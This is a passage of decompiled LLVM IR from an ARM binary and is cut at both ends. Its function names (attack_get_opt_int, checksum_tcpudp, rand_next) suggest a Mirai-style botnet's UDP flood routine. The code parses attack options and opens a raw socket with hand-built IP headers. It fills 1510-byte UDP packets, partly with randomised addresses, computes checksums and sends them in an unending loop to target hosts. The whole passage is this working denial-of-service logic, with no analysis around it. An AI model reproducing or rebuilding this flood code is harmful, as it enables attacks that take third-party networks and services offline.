  store i32 %v1_8f2c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_8f38 = load i32, i32* @r5, align 4
  store i32 %v0_8f38, i32* %r1.global-to-local, align 4
  %v0_8f3c = load i32, i32* @r4, align 4
  store i32 %v0_8f3c, i32* %r0.global-to-local, align 4
  %v5_8f40 = trunc i32 %v6_8f20 to i8
  %v6_8f44 = inttoptr i32 %v0_8f38 to i32*
  %v7_8f44 = call i32 @attack_get_opt_int(i32 %v0_8f3c, i32* %v6_8f44, i32 3, i32 65535)
  %v0_8f48 = load i32, i32* @r5, align 4
  store i32 %v0_8f48, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_8f58 = load i32, i32* @r4, align 4
  store i32 %v0_8f58, i32* %r0.global-to-local, align 4
  %v5_8f5c = inttoptr i32 %v0_8f48 to i32*
  %v6_8f5c = call i32 @attack_get_opt_int(i32 %v0_8f58, i32* %v5_8f5c, i32 4, i32 64)
  %v1_8f64 = urem i32 %v6_8f5c, 256
  store i32 %v1_8f64, i32* %ip.global-to-local, align 4
  %v0_8f68 = load i32, i32* @r5, align 4
  store i32 %v0_8f68, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8f74 = load i32, i32* @r4, align 4
  store i32 %v0_8f74, i32* %r0.global-to-local, align 4
  %v6_8f7c = inttoptr i32 %v0_8f68 to i32*
  %v7_8f7c = call i32 @attack_get_opt_int(i32 %v0_8f74, i32* %v6_8f7c, i32 5, i32 0)
  %v1_8f88 = urem i32 %v7_8f7c, 256
  store i32 %v1_8f88, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_8f94 = load i32, i32* @r5, align 4
  store i32 %v0_8f94, i32* %r1.global-to-local, align 4
  %v0_8f98 = load i32, i32* @r4, align 4
  store i32 %v0_8f98, i32* %r0.global-to-local, align 4
  %v5_8fa0 = inttoptr i32 %v0_8f94 to i32*
  %v6_8fa0 = call i32 @attack_get_opt_int(i32 %v0_8f98, i32* %v5_8fa0, i32 6, i32 65535)
  %v0_8fa8 = load i32, i32* @r5, align 4
  store i32 %v0_8fa8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_8fa0, i32* @sb, align 4
  %v0_8fb8 = load i32, i32* @r4, align 4
  store i32 %v0_8fb8, i32* %r0.global-to-local, align 4
  %v4_8fbc = inttoptr i32 %v0_8fa8 to i32*
  %v5_8fbc = call i32 @attack_get_opt_int(i32 %v0_8fb8, i32* %v4_8fbc, i32 7, i32 65535)
  %v0_8fc0 = load i32, i32* @r5, align 4
  store i32 %v0_8fc0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_8fbc, i32* @sl, align 4
  %v0_8fd0 = load i32, i32* @r4, align 4
  store i32 %v0_8fd0, i32* %r0.global-to-local, align 4
  %v4_8fd4 = inttoptr i32 %v0_8fc0 to i32*
  %v5_8fd4 = call i32 @attack_get_opt_int(i32 %v0_8fd0, i32* %v4_8fd4, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8fe0 = load i32, i32* @r5, align 4
  store i32 %v0_8fe0, i32* %r1.global-to-local, align 4
  store i32 %v5_8fd4, i32* @r6, align 4
  %v0_8fe8 = load i32, i32* @r4, align 4
  store i32 %v0_8fe8, i32* %r0.global-to-local, align 4
  %v4_8fec = inttoptr i32 %v0_8fe0 to i32*
  %v5_8fec = call i32 @attack_get_opt_int(i32 %v0_8fe8, i32* %v4_8fec, i32 1, i32 1)
  %v2_8ff8 = load i32, i32* @global_var_25d48.57, align 4
  store i32 %v2_8ff8, i32* %r3.global-to-local, align 4
  %v1_8ffc = urem i32 %v5_8fec, 256
  store i32 %v1_8ffc, i32* %ip.global-to-local, align 4
  %v0_9000 = load i32, i32* @r5, align 4
  store i32 %v0_9000, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9008 = load i32, i32* @r4, align 4
  store i32 %v0_9008, i32* %r0.global-to-local, align 4
  %v5_9010 = inttoptr i32 %v0_9000 to i32*
  %v6_9010 = call i32 @attack_get_opt_int(i32 %v0_9008, i32* %v5_9010, i32 25, i32 %v2_8ff8)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_9024 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_9024, i32* %r0.global-to-local, align 4
  %v7_9028 = icmp eq i32 %v3_9024, -1
  store i1 %v7_9028, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9024, i32* @fp, align 4
  br i1 %v7_9028, label %dec_label_pc_93c8, label %dec_label_pc_9034

dec_label_pc_9034:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_903c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_903c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9050 = call i32 @__GI_setsockopt(i32 %v3_9024, i32 0, i32 3, i32 %v6_903c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_9050, i32* %r0.global-to-local, align 4
  %v7_9054 = icmp eq i32 %v5_9050, -1
  store i1 %v7_9054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9054, label %dec_label_pc_93c0, label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9034
  %v0_905c = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_9068 = urem i32 %v0_905c, 65536
  store i32 %v3_9068, i32* %r2.global-to-local, align 4
  %v3_906c = icmp ugt i32 %v3_9068, 1459
  %v9_906c = icmp eq i32 %v3_9068, 1460
  store i1 %v9_906c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_906c, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_905c
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_905c, %bb
  %v0_90c8 = phi i32 [ %v3_9068, %dec_label_pc_905c ], [ 1460, %bb ]
  store i32 %v7_8f44, i32* %r0.global-to-local, align 4
  %v0_9078 = load i32, i32* @sb, align 4
  %v3_9080 = urem i32 %v0_9078, 65536
  store i32 %v3_9080, i32* %ip.global-to-local, align 4
  %v0_9084 = load i32, i32* @r7, align 4
  %v2_9084 = icmp eq i32 %v0_9084, 0
  store i1 %v2_9084, i1* %cpsr_z.global-to-local, align 1
  %v0_9088 = load i32, i32* @sl, align 4
  %v3_9088 = mul i32 %v0_9088, 65536
  br i1 %v2_9084, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  store i32 %v0_90c8, i32* %ip.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_90b8 = phi i32 [ %v3_9080, %bb48 ], [ %v0_90c8, %bb49 ]
  %v3_9098 = urem i32 %v0_9088, 65536
  store i32 %v3_9098, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_90a0 = urem i32 %v7_8f44, 65536
  store i32 %v3_90a0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9084, label %.thread, label %dec_label_pc_90c0

.thread:                                          ; preds = %bb50
  %v2_90b4 = add nsw i32 %v1_90b8, 28
  store i32 %v2_90b4, i32* @sb, align 4
  %v2_90b8 = add nsw i32 %v1_90b8, 8
  store i32 %v2_90b8, i32* @sl, align 4
  br label %dec_label_pc_91e4.preheader

dec_label_pc_90c0:                                ; preds = %bb50
  %v1_90c8 = add nuw nsw i32 %v0_90c8, 28
  store i32 %v1_90c8, i32* @sb, align 4
  %v1_90cc = add nuw nsw i32 %v0_90c8, 8
  store i32 %v1_90cc, i32* @sl, align 4
  %tmp51 = mul i32 %v0_9078, 256
  %v3_90e0 = and i32 %tmp51, 65280
  %tmp52 = udiv i32 %v0_9078, 256
  %v4_90f0 = urem i32 %tmp52, 256
  %v5_90f0 = or i32 %v4_90f0, %v3_90e0
  store i32 %v5_90f0, i32* @r6, align 4
  store i32 %v3_9088, i32* %r1.global-to-local, align 4
  %tmp53 = mul nuw nsw i32 %v1_90c8, 256
  %v3_90fc = and i32 %tmp53, 65280
  store i32 %v3_90fc, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v0_9088, 256
  %v3_9100 = and i32 %tmp54, 65280
  %tmp55 = mul nuw nsw i32 %v1_90cc, 256
  %v3_9104 = and i32 %tmp55, 65280
  store i32 %v3_9104, i32* %ip.global-to-local, align 4
  %tmp56 = udiv i32 %v1_90c8, 256
  %v4_9108 = urem i32 %tmp56, 256
  %v5_9108 = or i32 %v4_9108, %v3_90fc
  store i32 %v5_9108, i32* @lr, align 4
  %tmp57 = udiv i32 %v0_9088, 256
  %v4_910c = urem i32 %tmp57, 256
  %v5_910c = or i32 %v4_910c, %v3_9100
  store i32 %v5_910c, i32* %r0.global-to-local, align 4
  %trunc = trunc i32 %v1_90cc to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp58 = mul i32 %v7_8f44, 256
  %v3_9114 = and i32 %tmp58, 65280
  store i32 %v3_9114, i32* %r2.global-to-local, align 4
  %tmp59 = udiv i32 %v7_8f44, 256
  %v4_9124 = urem i32 %tmp59, 256
  %v5_9124 = or i32 %v4_9124, %v3_9114
  store i32 %v5_9124, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %v4_917c = sext i8 %v5_8f40 to i32
  %sext6 = mul nuw i32 %v5_9108, 65536
  %v4_9198 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_910c, 65536
  %v7_91cc = sdiv i32 %sext7, 65536
  %v1_918c = trunc i32 %v6_8f5c to i8
  %v3_91cc = sext i16 %rev to i32
  br label %dec_label_pc_912c

dec_label_pc_912c:                                ; preds = %.thread9, %dec_label_pc_90c0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_9138 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_9138, i32* %r0.global-to-local, align 4
  store i32 %v2_8f08, i32* %r3.global-to-local, align 4
  %v3_9140 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9140, i32* %r1.global-to-local, align 4
  %v2_9144 = load i32, i32* @r4, align 4
  %v5_9144 = mul i32 %v2_9144, 4
  %v6_9144 = add i32 %v5_9144, %v2_8f08
  %v7_9144 = inttoptr i32 %v6_9144 to i32*
  store i32 %v2_9138, i32* %v7_9144, align 4
  %v0_9148 = load i32, i32* %r3.global-to-local, align 4
  %v1_9148 = load i32, i32* %r1.global-to-local, align 4
  %v4_9148 = mul i32 %v1_9148, 4
  %v5_9148 = add i32 %v4_9148, %v0_9148
  %v6_9148 = inttoptr i32 %v5_9148 to i32*
  %v7_9148 = load i32, i32* %v6_9148, align 4
  store i32 %v7_9148, i32* %r0.global-to-local, align 4
  %v1_914c = inttoptr i32 %v7_9148 to i8*
  %v2_914c = load i8, i8* %v1_914c, align 1
  %tmp = urem i8 %v2_914c, 16
  %v1_9150 = zext i8 %tmp to i32
  %v1_9154 = or i32 %v1_9150, 64
  store i32 %v1_9154, i32* %r3.global-to-local, align 4
  %v1_9158 = trunc i32 %v1_9154 to i8
  store i8 %v1_9158, i8* %v1_914c, align 1
  %v0_915c = load i32, i32* %r0.global-to-local, align 4
  %v1_915c = inttoptr i32 %v0_915c to i8*
  %v2_915c = load i8, i8* %v1_915c, align 1
  %v1_9160 = and i8 %v2_915c, -16
  %v1_9164 = or i8 %v1_9160, 5
  store i32 %v1_8f88, i32* %ip.global-to-local, align 4
  %v0_916c = load i32, i32* %r1.global-to-local, align 4
  %v3_916c = mul i32 %v0_916c, 32
  store i32 %v3_916c, i32* %r2.global-to-local, align 4
  store i8 %v1_9164, i8* %v1_915c, align 1
  %v0_9174 = load i32, i32* %r1.global-to-local, align 4
  %v1_9174 = add i32 %v0_9174, 1
  store i32 %v1_9174, i32* @r4, align 4
  %v0_9178 = load i32, i32* %r2.global-to-local, align 4
  %tmp61 = mul i32 %v0_9174, -8
  %v5_9178 = add i32 %v0_9178, %tmp61
  store i32 %v5_9178, i32* %r2.global-to-local, align 4
  store i32 %v4_917c, i32* %r1.global-to-local, align 4
  %v2_9180 = load i32, i32* %r0.global-to-local, align 4
  %v3_9180 = add i32 %v2_9180, 1
  %v4_9180 = inttoptr i32 %v3_9180 to i8*
  store i8 %v5_8f40, i8* %v4_9180, align 1
  store i32 %v1_8f64, i32* %r3.global-to-local, align 4
  %v0_9188 = load i32, i32* %ip.global-to-local, align 4
  %v2_9188 = icmp eq i32 %v0_9188, 0
  store i1 %v2_9188, i1* %cpsr_z.global-to-local, align 1
  %v2_918c = load i32, i32* %r0.global-to-local, align 4
  %v3_918c = add i32 %v2_918c, 8
  %v4_918c = inttoptr i32 %v3_918c to i8*
  store i8 %v1_918c, i8* %v4_918c, align 1
  %v0_9190 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9190, label %.thread9, label %bb60

bb60:                                             ; preds = %dec_label_pc_912c
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_9194 = load i32, i32* %r0.global-to-local, align 4
  %v4_9194 = add i32 %v3_9194, 6
  %v5_9194 = inttoptr i32 %v4_9194 to i16*
  store i16 64, i16* %v5_9194, align 2
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_912c, %bb60
  store i32 %v4_9198, i32* %ip.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_91a0 = load i32, i32* %r0.global-to-local, align 4
  %v3_91a0 = add i32 %v2_91a0, 9
  %v4_91a0 = inttoptr i32 %v3_91a0 to i8*
  store i8 17, i8* %v4_91a0, align 1
  %v0_91a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_91a4 = trunc i32 %v0_91a4 to i16
  %v2_91a4 = load i32, i32* %r0.global-to-local, align 4
  %v3_91a4 = add i32 %v2_91a4, 2
  %v4_91a4 = inttoptr i32 %v3_91a4 to i16*
  store i16 %v1_91a4, i16* %v4_91a4, align 2
  store i32 %v6_9010, i32* %ip.global-to-local, align 4
  %v1_91ac = load i32, i32* %r0.global-to-local, align 4
  %v2_91ac = add i32 %v1_91ac, 12
  %v3_91ac = inttoptr i32 %v2_91ac to i32*
  store i32 %v6_9010, i32* %v3_91ac, align 4
  %v0_91b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_91b0 = load i32, i32* @r8, align 4
  %v2_91b0 = add i32 %v1_91b0, %v0_91b0
  store i32 %v2_91b0, i32* %r2.global-to-local, align 4
  %v1_91b4 = add i32 %v2_91b0, 16
  %v2_91b4 = inttoptr i32 %v1_91b4 to i32*
  %v3_91b4 = load i32, i32* %v2_91b4, align 4
  store i32 %v3_91b4, i32* %r3.global-to-local, align 4
  %v0_91b8 = load i32, i32* @r5, align 4
  %v1_91b8 = trunc i32 %v0_91b8 to i16
  %v2_91b8 = load i32, i32* %r0.global-to-local, align 4
  %v3_91b8 = add i32 %v2_91b8, 4
  %v4_91b8 = inttoptr i32 %v3_91b8 to i16*
  store i16 %v1_91b8, i16* %v4_91b8, align 2
  %v0_91bc = load i32, i32* %r0.global-to-local, align 4
  %v1_91bc = add i32 %v0_91bc, 20
  store i32 %v1_91bc, i32* %r1.global-to-local, align 4
  %v0_91c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_91c0 = add i32 %v0_91bc, 16
  %v3_91c0 = inttoptr i32 %v2_91c0 to i32*
  store i32 %v0_91c0, i32* %v3_91c0, align 4
  %v0_91c4 = load i32, i32* @r6, align 4
  %v1_91c4 = trunc i32 %v0_91c4 to i16
  %v2_91c4 = load i32, i32* %r0.global-to-local, align 4
  %v3_91c4 = add i32 %v2_91c4, 20
  %v4_91c4 = inttoptr i32 %v3_91c4 to i16*
  store i16 %v1_91c4, i16* %v4_91c4, align 2
  store i32 %v3_91cc, i32* %r0.global-to-local, align 4
  store i32 %v7_91cc, i32* %r3.global-to-local, align 4
  %v0_91d0 = load i32, i32* @r4, align 4
  %v1_91d0 = load i32, i32* @r7, align 4
  %v9_91d0 = icmp eq i32 %v0_91d0, %v1_91d0
  store i1 %v9_91d0, i1* %cpsr_z.global-to-local, align 1
  %v2_91d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_91d4 = add i32 %v2_91d4, 4
  %v4_91d4 = inttoptr i32 %v3_91d4 to i16*
  store i16 %rev, i16* %v4_91d4, align 2
  %v0_91d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_91d8 = trunc i32 %v0_91d8 to i16
  %v2_91d8 = load i32, i32* %r1.global-to-local, align 4
  %v3_91d8 = add i32 %v2_91d8, 2
  %v4_91d8 = inttoptr i32 %v3_91d8 to i16*
  store i16 %v1_91d8, i16* %v4_91d8, align 2
  %v0_91dc = load i32, i32* @r4, align 4
  store i32 %v0_91dc, i32* %stack_var_-44, align 4
  %v5_91e0 = icmp slt i32 %v0_91d0, %v1_91d0
  br i1 %v5_91e0, label %dec_label_pc_912c, label %dec_label_pc_91e4.preheader.loopexit

dec_label_pc_91e4.preheader.loopexit:             ; preds = %.thread9
  %v0_91e8.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_91e4.preheader

dec_label_pc_91e4.preheader:                      ; preds = %.thread, %dec_label_pc_91e4.preheader.loopexit
  %v0_91e8.pre = phi i32 [ %v0_91e8.pre.pre, %dec_label_pc_91e4.preheader.loopexit ], [ 0, %.thread ]
  %v3_9350 = icmp eq i32 %v6_9010, -1
  %v8_9350 = icmp eq i32 %v6_9010, -1
  %v3_9368 = icmp eq i32 %v3_90a0, 65535
  %v2_93a4 = icmp eq i32 %v1_8ffc, 0
  br label %dec_label_pc_91e4

dec_label_pc_91e4:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_92e4, %dec_label_pc_91e4.preheader
  %v0_91e8 = phi i32 [ %v0_91e8.pre, %dec_label_pc_91e4.preheader ], [ 0, %dec_label_pc_92e4 ], [ 0, %dec_label_pc_91e4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_91e8 = icmp eq i32 %v0_91e8, 0
  store i1 %v2_91e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_91e8, label %dec_label_pc_91e4, label %dec_label_pc_91f4

dec_label_pc_91f4:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_92e4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_91f8

dec_label_pc_91f8:                                ; preds = %dec_label_pc_9260, %dec_label_pc_91f4
  %v1_920c = phi i32 [ %v1_92d4, %dec_label_pc_9260 ], [ 0, %dec_label_pc_91f4 ]
  %v5_91fc = mul i32 %v1_920c, 24
  %v1_9200 = load i32, i32* @r8, align 4
  %v2_9200 = add i32 %v1_9200, %v5_91fc
  store i32 %v2_9200, i32* %r3.global-to-local, align 4
  store i32 %v2_8f08, i32* %r1.global-to-local, align 4
  %v1_9208 = add i32 %v2_9200, 20
  %v2_9208 = inttoptr i32 %v1_9208 to i8*
  %v3_9208 = load i8, i8* %v2_9208, align 1
  %v4_9208 = zext i8 %v3_9208 to i32
  store i32 %v4_9208, i32* %r2.global-to-local, align 4
  %v4_920c = mul i32 %v1_920c, 4
  %v5_920c = add i32 %v4_920c, %v2_8f08
  %v6_920c = inttoptr i32 %v5_920c to i32*
  %v7_920c = load i32, i32* %v6_920c, align 4
  store i32 %v7_920c, i32* @r5, align 4
  %v7_9210 = icmp eq i8 %v3_9208, 31
  store i1 %v7_9210, i1* %cpsr_z.global-to-local, align 1
  %v1_9214 = add i32 %v7_920c, 20
  store i32 %v1_9214, i32* @r6, align 4
  %tmp62 = icmp ult i8 %v3_9208, 32
  br i1 %tmp62, label %dec_label_pc_92f8, label %dec_label_pc_921c

dec_label_pc_921c:                                ; preds = %dec_label_pc_91f8
  store i32 %v6_9010, i32* %r3.global-to-local, align 4
  store i1 %v8_9350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_9350, label %dec_label_pc_9358, label %dec_label_pc_9228

dec_label_pc_9228:                                ; preds = %dec_label_pc_92f8, %dec_label_pc_921c
  store i32 %v3_90a0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9368, label %dec_label_pc_9374, label %dec_label_pc_923c

dec_label_pc_923c:                                ; preds = %dec_label_pc_9358.dec_label_pc_923c_crit_edge, %dec_label_pc_9228
  %v1_9240 = phi i32 [ %v1_9240.pre, %dec_label_pc_9358.dec_label_pc_923c_crit_edge ], [ 65535, %dec_label_pc_9228 ]
  store i32 %v3_9080, i32* %r0.global-to-local, align 4
  %v9_9240 = icmp eq i32 %v3_9080, %v1_9240
  store i1 %v9_9240, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9240, label %dec_label_pc_9388, label %dec_label_pc_9248

dec_label_pc_9248:                                ; preds = %dec_label_pc_9374, %dec_label_pc_923c
  %v1_924c = phi i32 [ %v1_9380, %dec_label_pc_9374 ], [ %v1_9240, %dec_label_pc_923c ]
  store i32 %v3_9098, i32* %r1.global-to-local, align 4
  %v9_924c = icmp eq i32 %v3_9098, %v1_924c
  store i1 %v9_924c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_924c, label %dec_label_pc_939c, label %dec_label_pc_9254

dec_label_pc_9254:                                ; preds = %dec_label_pc_9388, %dec_label_pc_9248
  store i32 %v1_8ffc, i32* %r3.global-to-local, align 4
  store i1 %v2_93a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_93a4, label %dec_label_pc_9260, label %dec_label_pc_93b0

dec_label_pc_9260:                                ; preds = %dec_label_pc_9254, %dec_label_pc_939c, %dec_label_pc_93b0
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_9264 = load i32, i32* @r5, align 4
  %v3_9264 = add i32 %v2_9264, 10
  %v4_9264 = inttoptr i32 %v3_9264 to i16*
  store i16 0, i16* %v4_9264, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_926c = load i32, i32* @r5, align 4
  store i32 %v0_926c, i32* @r0, align 4
  %v2_9270 = call i32 @checksum_generic(i32 %v0_926c, i32 20)
  %v3_9270 = trunc i32 %v2_9270 to i16
  %v3_9274 = load i32, i32* @r5, align 4
  %v4_9274 = add i32 %v3_9274, 10
  %v5_9274 = inttoptr i32 %v4_9274 to i16*
  store i16 %v3_9270, i16* %v5_9274, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_927c = load i32, i32* @r6, align 4
  %v3_927c = add i32 %v2_927c, 6
  %v4_927c = inttoptr i32 %v3_927c to i16*
  store i16 0, i16* %v4_927c, align 2
  %v0_9280 = load i32, i32* @r6, align 4
  store i32 %v0_9280, i32* @r1, align 4
  %v1_9284 = add i32 %v0_9280, 4
  %v2_9284 = inttoptr i32 %v1_9284 to i16*
  %v3_9284 = load i16, i16* %v2_9284, align 2
  %v4_9284 = zext i16 %v3_9284 to i32
  store i32 %v4_9284, i32* %r2.global-to-local, align 4
  %v0_9288 = load i32, i32* @sl, align 4
  store i32 %v0_9288, i32* %r3.global-to-local, align 4
  %v0_928c = load i32, i32* @r5, align 4
  store i32 %v0_928c, i32* %r0.global-to-local, align 4
  %v4_9290 = call i32 @checksum_tcpudp(i32 %v0_928c, i32 %v0_9280, i32 %v4_9284, i32 %v0_9288)
  %v5_9290 = trunc i32 %v4_9290 to i16
  store i32 %v4_9290, i32* %r0.global-to-local, align 4
  %v3_9294 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9294, i32* %r3.global-to-local, align 4
  %v3_9298 = mul i32 %v3_9294, 32
  store i32 %v3_9298, i32* %lr.global-to-local, align 4
  %v3_929c = load i32, i32* @r6, align 4
  %v4_929c = add i32 %v3_929c, 6
  %v5_929c = inttoptr i32 %v4_929c to i16*
  store i16 %v5_9290, i16* %v5_929c, align 2
  %v0_92a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_92a0 = load i32, i32* %r3.global-to-local, align 4
  %tmp63 = mul i32 %v1_92a0, -8
  %v5_92a0 = add i32 %v0_92a0, %tmp63
  store i32 %v5_92a0, i32* %lr.global-to-local, align 4
  %v0_92a4 = load i32, i32* @r6, align 4
  %v1_92a4 = add i32 %v0_92a4, 2
  %v2_92a4 = inttoptr i32 %v1_92a4 to i16*
  %v3_92a4 = load i16, i16* %v2_92a4, align 2
  %v4_92a4 = zext i16 %v3_92a4 to i32
  store i32 %v4_92a4, i32* @r6, align 4
  %v1_92a8 = load i32, i32* @r8, align 4
  %v2_92a8 = add i32 %v1_92a8, %v5_92a0
  store i32 %v2_92a8, i32* @lr, align 4
  %v3_92ac = add i32 %v2_92a8, 2
  %v4_92ac = inttoptr i32 %v3_92ac to i16*
  store i16 %v3_92a4, i16* %v4_92ac, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_92b8 = load i32, i32* @r5, align 4
  store i32 %v0_92b8, i32* %r1.global-to-local, align 4
  %v0_92bc = load i32, i32* @fp, align 4
  store i32 %v0_92bc, i32* %r0.global-to-local, align 4
  %v0_92c0 = load i32, i32* @sb, align 4
  store i32 %v0_92c0, i32* %r2.global-to-local, align 4
  %v0_92c4 = load i32, i32* @lr, align 4
  %v6_92cc = call i32 @__libc_sendto(i32 %v0_92bc, i32 %v0_92b8, i32 %v0_92c0, i32 16384, i32 %v0_92c4, i32 16)
  %v3_92d0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_92d0, i32* %r3.global-to-local, align 4
  %v1_92d4 = add i32 %v3_92d0, 1
  store i32 %v1_92d4, i32* %r0.global-to-local, align 4
  %v1_92d8 = load i32, i32* @r7, align 4
  %v9_92d8 = icmp eq i32 %v1_92d4, %v1_92d8
  store i1 %v9_92d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_92d4, i32* %stack_var_-44, align 4
  %v5_92e0 = icmp slt i32 %v1_92d4, %v1_92d8
  br i1 %v5_92e0, label %dec_label_pc_91f8, label %dec_label_pc_92e4

dec_label_pc_92e4:                                ; preds = %dec_label_pc_9260
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_92e8 = icmp eq i32 %v1_92d8, 0
  store i1 %v2_92e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_92e8, label %dec_label_pc_91e4, label %dec_label_pc_91f4

dec_label_pc_92f8:                                ; preds = %dec_label_pc_91f8
  %v1_92f8 = add i32 %v2_9200, 16
  %v2_92f8 = inttoptr i32 %v1_92f8 to i32*
  %v3_92f8 = load i32, i32* %v2_92f8, align 4
  %v0_92fc = call i32 @rand_next()
  store i32 %v0_92fc, i32* %r0.global-to-local, align 4
  %v3_9300 = load i32, i32* %stack_var_-44, align 4
  %v5_9308 = mul i32 %v3_9300, 24
  %v1_930c = and i32 %v3_92f8, 16711680
  store i32 %v1_930c, i32* %ip.global-to-local, align 4
  %v3_9310 = udiv i32 %v3_92f8, 16777216
  %v4_9314 = udiv i32 %v1_930c, 256
  %v5_9314 = or i32 %v4_9314, %v3_9310
  store i32 %v5_9314, i32* %r2.global-to-local, align 4
  %v1_9318 = load i32, i32* @r8, align 4
  %v2_9318 = add i32 %v1_9318, %v5_9308
  store i32 %v2_9318, i32* %r1.global-to-local, align 4
  %v1_931c = and i32 %v3_92f8, 65280
  store i32 %v1_931c, i32* %r3.global-to-local, align 4
  %v1_9320 = add i32 %v2_9318, 20
  %v2_9320 = inttoptr i32 %v1_9320 to i8*
  %v3_9320 = load i8, i8* %v2_9320, align 1
  %v4_9320 = zext i8 %v3_9320 to i32
  store i32 %v4_9320, i32* %ip.global-to-local, align 4
  %v5_9328 = call i32 @llvm.bswap.i32(i32 %v3_92f8)
  %v7_932c = lshr i32 %v0_92fc, %v4_9320
  %v8_932c = add i32 %v7_932c, %v5_9328
  store i32 %v8_932c, i32* %r2.global-to-local, align 4
  %v1_9330 = and i32 %v8_932c, 16711680
  store i32 %v1_9330, i32* %r0.global-to-local, align 4
  %v1_933c = and i32 %v8_932c, 65280
  store i32 %v1_933c, i32* %r1.global-to-local, align 4
  %v5_9344 = call i32 @llvm.bswap.i32(i32 %v8_932c)
  %v1_9348 = load i32, i32* @r5, align 4
  %v2_9348 = add i32 %v1_9348, 16
  %v3_9348 = inttoptr i32 %v2_9348 to i32*
  store i32 %v5_9344, i32* %v3_9348, align 4
  store i32 %v6_9010, i32* %r3.global-to-local, align 4
  store i1 %v8_9350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9350, label %dec_label_pc_9358, label %dec_label_pc_9228

dec_label_pc_9358:                                ; preds = %dec_label_pc_92f8, %dec_label_pc_921c
  %v0_9358 = call i32 @rand_next()
  store i32 %v0_9358, i32* %r0.global-to-local, align 4
  store i32 %v3_90a0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9368, i1* %cpsr_z.global-to-local, align 1
  %v1_936c = load i32, i32* @r5, align 4
  %v2_936c = add i32 %v1_936c, 12
  %v3_936c = inttoptr i32 %v2_936c to i32*
